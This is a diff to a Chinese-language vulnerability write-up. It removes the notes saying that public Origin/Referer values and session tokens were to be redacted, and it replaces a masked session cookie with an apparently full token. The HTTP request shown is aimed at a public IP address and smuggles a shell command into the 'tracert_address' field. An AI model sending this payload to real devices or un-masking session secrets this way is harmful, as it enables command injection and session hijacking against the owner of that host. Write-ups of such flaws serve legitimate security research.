@@ -34,10 +34,9 @@ source_status: "recorded"
 ### 逐项校订
 
 - 含空图片&#33;[]()，这是正文未提供地址而非工作区图片省略
-- 公网Origin/Referer和会话需脱敏；无结果或源码
+- 无结果或源码
 - 不能直接称控制内部网络，尚需其他环境条件
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -79,7 +78,7 @@ Origin: http://175.167.44.37:6060
 Referer: http://175.167.44.37:6060/
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: bcrsession=f1d**************************************************************************536
+Cookie: bcrsession=f1d7956e195d123d8f0b4a6670553a7cda05348636f998dddeff1d3f3fe1fc8d87ed86b4b4818536
 Connection: close
 
 {"tracert_address":"||echo `id`","is_first_req":true}
